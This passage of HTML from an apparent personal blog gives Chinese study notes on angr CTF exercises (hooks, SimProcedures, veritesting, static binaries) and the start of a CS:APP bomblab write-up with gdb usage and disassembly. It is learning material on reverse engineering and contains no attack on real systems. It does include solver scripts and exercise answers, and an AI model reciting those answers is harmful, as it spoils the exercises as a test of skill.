class="number">16</span></span><br><span class="line">        usr_input_string=state.memory.load(buffer_address,buffer_len)</span><br><span class="line">        compare_data=<span class="string">&#x27;OSIWHBXIFOQVSBZB&#x27;</span>.encode()</span><br><span class="line"></span><br><span class="line">        <span class="comment">##相等则设置寄存器eax的值为1，因为我们在对状态进行操作，所以不能直接使用if else语句</span></span><br><span class="line">        state.regs.eax=claripy.If(usr_input_string==compare_data,claripy.BVV(<span class="number">1</span>, <span class="number">32</span>),claripy.BVV(<span class="number">0</span>, <span class="number">32</span>) )</span><br><span class="line">        </span><br><span class="line">    sm=project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_good</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_bad</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    sm.explore(find=is_good,avoid=is_bad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sm.found:</span><br><span class="line">        solution_state=sm.found[<span class="number">0</span>]</span><br><span class="line">        solution = solution_state.posix.dumps(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(solution)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用地址hook，最后部分模仿函数返回值，返回值储存在寄存器eax中。</p>
<p>在ida查看命令字节码长度。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##定义执行完要跳过多少字节，这意味着我们直接替换了这个函数</span></span><br><span class="line">    jump_len=<span class="number">5</span></span><br><span class="line"><span class="meta">    @project.hook(<span class="params">checkfun_address,length=jump_len</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fake_checkfun</span>(<span class="params">state</span>):</span><br><span class="line">        buffer_address=<span class="number">0x0804A044</span></span><br><span class="line">        buffer_len=<span class="number">16</span></span><br><span class="line">        usr_input_string=state.memory.load(buffer_address,buffer_len)</span><br><span class="line">        compare_data=<span class="string">&#x27;OSIWHBXIFOQVSBZB&#x27;</span>.encode()</span><br><span class="line"></span><br><span class="line">        <span class="comment">##相等则设置寄存器eax的值为1，因为我们在对状态进行操作，所以不能直接使用if else语句</span></span><br><span class="line">        state.regs.eax=claripy.If(usr_input_string==compare_data,claripy.BVV(<span class="number">1</span>, <span class="number">32</span>),claripy.BVV(<span class="number">0</span>, <span class="number">32</span>) )</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230528022728.png"></p>
<h2 id="10-angr-simprocedures"><a href="#10-angr-simprocedures" class="headerlink" title="10_angr_simprocedures"></a>10_angr_simprocedures</h2><p>仍然是利用hook解决路径爆炸的问题，上一题是利用地址比较麻烦，现在学习利用函数名来hook，有点像最开始的时候用函数替换good job的地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    path=argv[<span class="number">1</span>]</span><br><span class="line">    project=angr.Project(path)</span><br><span class="line">    init_state=project.factory.entry_state()</span><br><span class="line">    <span class="comment">##定义一个继承angr.simprocedure的类</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Replacefun</span>(angr.SimProcedure):</span><br><span class="line">          <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self,to_check,length</span>):</span><br><span class="line">                buffer_address=to_check</span><br><span class="line">                buffer_length=length</span><br><span class="line"></span><br><span class="line">                user_input_string=self.state.memory.load(buffer_address,buffer_length)</span><br><span class="line">                comparedata=<span class="string">&#x27;OSIWHBXIFOQVSBZB&#x27;</span>.encode()</span><br><span class="line">                <span class="keyword">return</span> claripy.If(</span><br><span class="line">                      user_input_string==comparedata,</span><br><span class="line">                      claripy.BVV(<span class="number">1</span>,<span class="number">32</span>),</span><br><span class="line">                      claripy.BVV(<span class="number">0</span>,<span class="number">32</span>)</span><br><span class="line">                )</span><br><span class="line">    check_equals_symbol=<span class="string">&#x27;check_equals_OSIWHBXIFOQVSBZB&#x27;</span><span class="comment">##函数名</span></span><br><span class="line">    project.hook_symbol(check_equals_symbol,Replacefun())</span><br><span class="line"></span><br><span class="line">    sm=project.factory.simgr(init_state)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_good</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_bad</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    sm.explore(find=is_good,avoid=is_bad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sm.found:</span><br><span class="line">        solution_state=sm.found[<span class="number">0</span>]</span><br><span class="line">        solution = solution_state.posix.dumps(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(solution)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line">          </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        main(sys.argv)</span><br></pre></td></tr></table></figure>

<p>把新知识点放下面</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##定义一个继承angr.simprocedure的类</span></span><br><span class="line">   <span class="keyword">class</span> <span class="title class_">Replacefun</span>(angr.SimProcedure):</span><br><span class="line">       <span class="comment">##后面两个参数按照原函数check_equals_OSIWHBXIFOQVSBZB来</span></span><br><span class="line">         <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self,to_check,length</span>):</span><br><span class="line">               buffer_address=to_check</span><br><span class="line">               buffer_length=length</span><br><span class="line"></span><br><span class="line">               user_input_string=self.state.memory.load(buffer_address,buffer_length)</span><br><span class="line">               comparedata=<span class="string">&#x27;OSIWHBXIFOQVSBZB&#x27;</span>.encode()</span><br><span class="line">               <span class="keyword">return</span> claripy.If(</span><br><span class="line">                     user_input_string==comparedata,</span><br><span class="line">                     claripy.BVV(<span class="number">1</span>,<span class="number">32</span>),</span><br><span class="line">                     claripy.BVV(<span class="number">0</span>,<span class="number">32</span>)</span><br><span class="line">               )</span><br><span class="line">   check_equals_symbol=<span class="string">&#x27;check_equals_OSIWHBXIFOQVSBZB&#x27;</span><span class="comment">##函数名</span></span><br><span class="line">   project.hook_symbol(check_equals_symbol,Replacefun())</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230528114046.png"></p>
<h2 id="11-angr-sim-scanf"><a href="#11-angr-sim-scanf" class="headerlink" title="11_angr_sim_scanf"></a>11_angr_sim_scanf</h2><p>和上面的一样，用来巩固。这样处理之后scanf可以接收多个参数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    path=argv[<span class="number">1</span>]</span><br><span class="line">    project=angr.Project(path)</span><br><span class="line">    init_state=project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">myscanf</span>(angr.SimProcedure):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self,format_string,para0,para1</span>):</span><br><span class="line">            input0=claripy.BVS(<span class="string">&#x27;input0&#x27;</span>,<span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line">            input1=claripy.BVS(<span class="string">&#x27;input1&#x27;</span>,<span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">            self.state.memory.store(para0,input0,endness=project.arch.memory_endness)</span><br><span class="line">            self.state.memory.store(para1,input1,endness=project.arch.memory_endness)</span><br><span class="line">            </span><br><span class="line">            self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solution0&#x27;</span>]=input0</span><br><span class="line">            self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solution1&#x27;</span>]=input1</span><br><span class="line"></span><br><span class="line">    scanf_symbol=<span class="string">&#x27;__isoc99_scanf&#x27;</span></span><br><span class="line">    project.hook_symbol(scanf_symbol,myscanf())</span><br><span class="line"></span><br><span class="line">    sm=project.factory.simgr(init_state)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_good</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_bad</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    sm.explore(find=is_good,avoid=is_bad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sm.found:</span><br><span class="line">        solution_state=sm.found[<span class="number">0</span>]</span><br><span class="line">        stored_solutions0 = solution_state.<span class="built_in">globals</span>[<span class="string">&#x27;solution0&#x27;</span>]</span><br><span class="line">        stored_solutions1 = solution_state.<span class="built_in">globals</span>[<span class="string">&#x27;solution1&#x27;</span>]</span><br><span class="line">        solution = <span class="string">f&#x27;<span class="subst">&#123;solution_state.solver.<span class="built_in">eval</span>(stored_solutions0)&#125;</span> <span class="subst">&#123;solution_state.solver.<span class="built_in">eval</span>(stored_solutions1)&#125;</span>&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(solution)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230528115054.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##用myscanf来代替__isoc99_scanf</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myscanf</span>(angr.SimProcedure):</span><br><span class="line">   <span class="comment">##后面三个参数分别为格式化字符串，输入1，输入2</span></span><br><span class="line">       <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self,format_string,para0,para1</span>):</span><br><span class="line">           <span class="comment">##符号化输入内容</span></span><br><span class="line">           input0=claripy.BVS(<span class="string">&#x27;input0&#x27;</span>,<span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line">           input1=claripy.BVS(<span class="string">&#x27;input1&#x27;</span>,<span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line">           <span class="comment">##将符号向量载入内存buffer处</span></span><br><span class="line">           self.state.memory.store(para0,input0,endness=project.arch.memory_endness)</span><br><span class="line">           self.state.memory.store(para1,input1,endness=project.arch.memory_endness)</span><br><span class="line">           <span class="comment">##将函数内的局部变量input转变为全局变量solution</span></span><br><span class="line">           self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solution0&#x27;</span>]=input0</span><br><span class="line">           self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solution1&#x27;</span>]=input1</span><br><span class="line"></span><br><span class="line">   scanf_symbol=<span class="string">&#x27;__isoc99_scanf&#x27;</span></span><br><span class="line">   project.hook_symbol(scanf_symbol,myscanf())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230528150540.png"></p>
<h2 id="12-angr-veritesting"><a href="#12-angr-veritesting" class="headerlink" title="12_angr_veritesting"></a>12_angr_veritesting</h2><p>之前使用hook或者添加约束来解决路径爆炸问题，现在直接在创建虚拟管理器的时候加上一个参数，simulation&#x3D;project.factory.simgr(init_state,veritesting&#x3D;True)</p>
<blockquote>
<p>简单来说就是Veritesting结合了静态符合执行与动态符号执行，减少了路径爆炸的影响，在angr里我们只要在构造模拟管理器时，启用Veritesting了就行</p>
</blockquote>
<p>不知道什么原因这个程序跑起来内存就会爆炸，看来还是没解决路径爆炸的问题，推测可能是环境的问题。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    path=argv[<span class="number">1</span>]</span><br><span class="line">    project=angr.Project(path)</span><br><span class="line">    init_state=project.factory.entry_state()</span><br><span class="line">    simulation=project.factory.simgr(init_state,veritesting=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_good</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_bad</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    simulation.explore(find=is_good,avoid=is_bad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state=simulation.found[<span class="number">0</span>]</span><br><span class="line">        solution=solution_state.posix(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(solution)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;no found&#x27;</span>）</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230528172818.png"></p>
<h2 id="13-angr-static-binary"><a href="#13-angr-static-binary" class="headerlink" title="13_angr_static_binary"></a>13_angr_static_binary</h2><blockquote>
<p>作者文档里的内容：</p>
<p>这个挑战与第一个挑战完全相同，只是它被编译为静态二进制文件。通常，Angr会自动使用SimProcedures替换标准库函数，以实现更快的运行速度。</p>
<p>为了解决这个挑战，需要手动hook任何使用的标准库c函数。</p>
</blockquote>
<p>什么叫静态什么叫动态？<img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230528203748.png"></p>
<p>拖进ida里很容易看出来，题目13function那一栏里比12多得多，这是因为<strong>静态链接</strong>库将所有依赖项都包含在目标二进制文件中，反观<strong>动态链接</strong>，同台链接是指程序在训醒时才需要加载所依赖的库，当我们使用动态链接库来编译程序时，编译器并不会将所有库函数的代码都合并为一个单独的可执行文件。相反，它只是在可执行文件中留下一些标记，以便在运行时从系统或其他位置加载动态链接库。</p>
<p>在静态链接库中，没有动态链接库来提供符号，我们需要手动hook任何使用的标准库c函数，并确保从main函数的开头开始执行。</p>
<p>在动态链接库中，动态链接器会提供符号，我们不需要手动hook标准库c函数。</p>
<p>这一题我们就要将main函数里所用到的标准库函数hook住，用angr的方法来取代，这能大大提高效率。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    path=argv[<span class="number">1</span>]</span><br><span class="line">    project=angr.Project(path)</span><br><span class="line">    init_state=project.factory.entry_state()</span><br><span class="line">    </span><br><span class="line">    printf_address=<span class="number">0x0804FAB0</span></span><br><span class="line">    scanf_address=<span class="number">0x0804FB10</span></span><br><span class="line">    strcmp_address=<span class="number">0x08048228</span></span><br><span class="line">    puts_address=<span class="number">0x080503F0</span></span><br><span class="line">    __libc_start_main_address=<span class="number">0x08048D60</span></span><br><span class="line"></span><br><span class="line">    project.hook(printf_address,angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;printf&#x27;</span>]())</span><br><span class="line">    project.hook(scanf_address,angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;scanf&#x27;</span>]())</span><br><span class="line">    project.hook(strcmp_address,angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;strcmp&#x27;</span>]())</span><br><span class="line">    project.hook(puts_address,angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;puts&#x27;</span>]())</span><br><span class="line">    <span class="comment">##重点关注一下这里不太清楚是个啥</span></span><br><span class="line">    project.hook(__libc_start_main_address,angr.SIM_PROCEDURES[<span class="string">&#x27;glibc&#x27;</span>][<span class="string">&#x27;__libc_start_main&#x27;</span>]())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isgood</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isbad</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    simulation=project.factory.simgr(init_state)</span><br><span class="line">    simulation.explore(find=isgood,avoid=isbad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state=simulation.found[<span class="number">0</span>]</span><br><span class="line">        solution=solution_state.posix.dumps(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(solution)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;no found&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230528211108.png"></p>
<h2 id="14-angr-shared-library"><a href="#14-angr-shared-library" class="headerlink" title="14_angr_shared_library"></a>14_angr_shared_library</h2><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      <tags>
        <tag>angr</tag>
      </tags>
  </entry>
  <entry>
    <title>bomblab</title>
    <url>/2023/06/02/bomblab/</url>
    <content><![CDATA[<p>解压完出现了三个文件bomb、bomb.c、readme，其中bomb.c是实验的源代码，不过他最重要的部分被删除了。我们可以通过将可执行文件bomb反汇编来查看内部情况。通过objdump -d bomb &gt; bomb.asm我们获得了一个新的文件，内容是bomb的汇编代码。</p>
<span id="more"></span>

<h2 id="gdb的使用"><a href="#gdb的使用" class="headerlink" title="gdb的使用"></a>gdb的使用</h2><table>
<thead>
<tr>
<th>基本命令</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>1.进入调试状态</td>
<td>gdb bomb</td>
<td>后面的bomb是我们要调试的程序</td>
</tr>
<tr>
<td>2.查看源码</td>
<td>(gdb) l</td>
<td>前面的（gdb）代表已经进入调试状态，后面的l，将源码按行号显示</td>
</tr>
<tr>
<td>3.设置断点</td>
<td>(gdb) b   6</td>
<td>意思是运行到源码的第六行时停止（第六行的指令没有执行）</td>
</tr>
<tr>
<td>4.查看断点情况</td>
<td>(gdb) info b</td>
<td>将我们设置的断点列举出来</td>
</tr>
<tr>
<td>5.运行代码</td>
<td>(gdb) r</td>
<td></td>
</tr>
<tr>
<td>6.显示变量值</td>
<td>(gdb) p n</td>
<td>p（print）变量名</td>
</tr>
<tr>
<td>7.单步运行</td>
<td>(gdb) n</td>
<td>next</td>
</tr>
<tr>
<td>8.程序继续运行</td>
<td>(gdb) c</td>
<td>continue</td>
</tr>
<tr>
<td>9.退出</td>
<td>(gdb) q</td>
<td>quit</td>
</tr>
<tr>
<td>10.访问内存</td>
<td>x&#x2F;参数 &lt;地址&gt;</td>
<td>参数s是输出为字符串，d为十进制输出，x为十六进制输出</td>
</tr>
<tr>
<td>11.跟踪寄存器</td>
<td>display&lt;$寄存器&gt;</td>
<td>碰到断点停下时显示所有跟踪寄存器的值</td>
</tr>
</tbody></table>
<p>用$前缀表示一个立即数</p>
<p>函数传参：当参数个数小于等于6个时，使用寄存器<strong>rdi,rsi,rdx,rcx,r8,r9，从第7个参数开始通过栈传递，顺序为从右往左入栈。</strong>csapp 3.7</p>
<h2 id="实验部分"><a href="#实验部分" class="headerlink" title="实验部分"></a>实验部分</h2><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h3><p>这就是第一个炸弹</p>
<p><img src="/2023/06/02/bomblab/QQ%E6%88%AA%E5%9B%BE20230424151255.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:	48 83 ec 08          	sub    $0x8,%rsp                   ;创建栈帧</span><br><span class="line">  400ee4:	be 00 24 40 00       	mov    $0x402400,%esi              ;将0x402400复制到esi中，前去查看</span><br><span class="line">  400ee9:	e8 4a 04 00 00       	call   401338 &lt;strings_not_equal&gt;  ;根据名字来看，调用比较函数</span><br><span class="line">  400eee:	85 c0                	test   %eax,%eax                    </span><br><span class="line">  400ef0:	74 05                	je     400ef7 &lt;phase_1+0x17&gt;        ;相等则跳转</span><br><span class="line">  400ef2:	e8 43 05 00 00       	call   40143a &lt;explode_bomb&gt;        ;爆炸</span><br><span class="line">  400ef7:	48 83 c4 08          	add    $0x8,%rsp                    ;恢复栈帧</span><br><span class="line">  400efb:	c3                   	ret    </span><br></pre></td></tr></table></figure>

<p>test执行过程与and相似，但他只设置条件码寄存器，不改变目的寄存器中的值。这里的用法是，如果返回值为零，则条件码寄存器置1，je进行跳转。</p>
<p>我们用x&#x2F;s 0x402400查看以0x402400为首地址的字符串。</p>
<p>先把一个值（字符串的地址）放到了%esi里，而放到%edi里的就是我们输入的字符串地址，记住传参顺序，di、si、dx、cx、r8、r9.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x402400</span><br><span class="line">0x402400:       &quot;Border relations with Canada have never been better.&quot;</span><br></pre></td></tr></table></figure>

<h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h3><p>第二个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:	55                   	push   rbp                     ;保存栈帧寄存器</span><br><span class="line">  400efd:	53                   	push   rbx                </span><br><span class="line">  400efe:	48 83 ec 28          	sub    rsp,0x28                </span><br><span class="line">  400f02:	48 89 e6             	mov    rsi,rsp        ;-------------------为函数的调用做准备</span><br><span class="line">  400f05:	e8 52 05 00 00       	call   40145c &lt;read_six_numbers&gt;</span><br><span class="line">  400f0a:	83 3c 24 01          	cmp    DWORD PTR [rsp],0x1</span><br><span class="line">  400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:	e8 25 05 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:	eb 19                	jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:	8b 43 fc             	mov    eax,DWORD PTR [rbx-0x4]</span><br><span class="line">  400f1a:	01 c0                	add    eax,eax</span><br><span class="line">  400f1c:	39 03                	cmp    DWORD PTR [rbx],eax</span><br><span class="line">  400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">  400f20:	e8 15 05 00 00       	call   40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:	48 83 c3 04          	add    rbx,0x4</span><br><span class="line">  400f29:	48 39 eb             	cmp    rbx,rbp</span><br><span class="line">  400f2c:	75 e9                	jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:	eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:	48 8d 5c 24 04       	lea    rbx,[rsp+0x4]             ;将(rsp)+0x4赋值给rbx</span><br><span class="line">  400f35:	48 8d 6c 24 18       	lea    rbp,[rsp+0x18]</span><br><span class="line">  400f3a:	eb db                	jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:	48 83 c4 28          	add    rsp,0x28</span><br><span class="line">  400f40:	5b                   	pop    rbx</span><br><span class="line">  400f41:	5d                   	pop    rbp</span><br><span class="line">  400f42:	c3                   	ret    </span><br></pre></td></tr></table></figure>

<p>不太熟悉lea指令，先学一下。</p>
<p>lea是“load effective address”的缩写，把一个内存变量的有效地址送给指定的寄存器，简单地说lea指令可以用来将一个内存地址直接赋值给目的操作数。lea eax,[ebx+8]是将ebx+8这个值直接赋值给eax，与之相似的mov指令，mov eax,[ebx+8]是将内存地址为ebx+8处的数据赋值给eax。对于lea指令，lea eax，eax是会报错的，只能lea eax，[eax] 等同于mov eax,eax其实就是【eax】就是eax的值。</p>
<p>理一下逻辑：</p>
<p>1.调用函数，接收六个数字</p>
<p>2.[rsp]和0x1对比，所以(rsp)&#x3D;1</p>
<p>3.如果相等则进行跳转，不相等则爆炸！！！</p>
<p>4.将rsp+4和rsp+0x18分别赋值给rbx和rbp</p>
<p>5.跳转，将地址为rbx-4处的数据赋值给eax</p>
<p>6.将eax乘2</p>
<p>7.[rbx]和eax进行比较</p>
<p>8.相等则将rbx+4，不相等则爆炸！！！！</p>
<p>9.比较rbx和rbp，如果相等则结束程序（success），如果不相等则跳转到步骤5.</p>
<p>第四行的指令mov rsi，rsp，rsi是传递第二个参数的寄存器，他保存的是什么值？保存的是栈指针，也就是栈顶地址。那么第一个参数呢，我们有理由怀疑我们的输入是第一个参数，正如pgase1中，根据函数名我们可以判断，读入六个数字。</p>
<p><img src="/2023/06/02/bomblab/QQ%E6%88%AA%E5%9B%BE20230425144102.png"></p>
<p>可以看到他将第二个参数赋值给了rdx，然后下面的rsi+4和rsi+0x14，0x14&#x3D;&#x3D;24，通过lea指令将距离栈顶第二个元素的地址和第七个元素的地址（末尾标志）传入了相关寄存器，注意这里的[rsi],因为前面提到过，rsi里存放的是栈顶地址，所以可以这么解释。这么复杂加上后面的sscanf大概猜测一下，就是将我们输入的6个数字放入首地址为rsp的内存空间中。我么可以查看一下mov esi,0x4025c3这条指令输入的十六个整型。</p>
<p><img src="/2023/06/02/bomblab/QQ%E6%88%AA%E5%9B%BE20230425154617.png"></p>
<p>回到phase2函数，再调用完读取函数之后，进行了一次比较，如果输入的第一个数不是0x1则爆炸。继续往下，将输入的第二个数（【rsp+4】）送入rbp，将[rsp+0x18]送入rbp（栈帧寄存器），下面其实是个循环，通过比较指令和跳转指令来实现，add    rbx,0x4这条指令相当于一个计数器。大致实现的逻辑是将第二个如放入rbx，将钱一个数字放入rax，将rax进行乘2操作，进行比较。其实只要看出这一题的循环，很多东西都是水到渠成的顺出来的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp    rbx,rbp</span><br><span class="line">75 e9                	jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt;</span><br></pre></td></tr></table></figure>

<p>每比较一次都会对rbx+4，当rbx+4与我们设置的末尾表值相同时就会结束循环。0x4–&gt;0x18,差为24，正好循环六次</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">6</span>]=&#123;<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        arr[i+<span class="number">1</span>]=arr[i]*<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">;<span 